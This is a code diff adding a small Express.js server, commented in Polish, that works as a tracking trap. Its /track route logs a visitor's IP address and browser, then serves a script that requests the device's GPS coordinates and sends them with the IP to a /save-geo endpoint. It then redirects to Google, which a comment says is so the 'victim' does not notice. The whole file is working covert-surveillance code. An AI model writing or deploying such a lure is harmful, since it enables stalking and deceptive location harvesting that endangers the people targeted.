@@ -1,0 +1,20 @@
+const express = require('express');
+const app = express();
+
+app.get('/track', (req, res) => {
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const userAgent = req.headers['user-agent'];
+    console.log(`ZŁAPANY! IP: ${ip}, Przeglądarka: ${userAgent}`);
+    
+    // Wysyła do ofiary skrypt JS, który wyciągnie dokładny GPS (wymaga zgody w przeglądarce)
+    res.send(`
+        <script>
+            navigator.geolocation.getCurrentPosition(pos => {
+                fetch('/save-geo?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude + '&ip=${ip}');
+            });
+            window.location.href = "https://www.google.com"; // Przekierowanie, żeby się nie połapali
+        </script>
+    `);
+});
+
+app.listen(3000, () => console.log('Pułapka gotowa na porcie 3000!'));
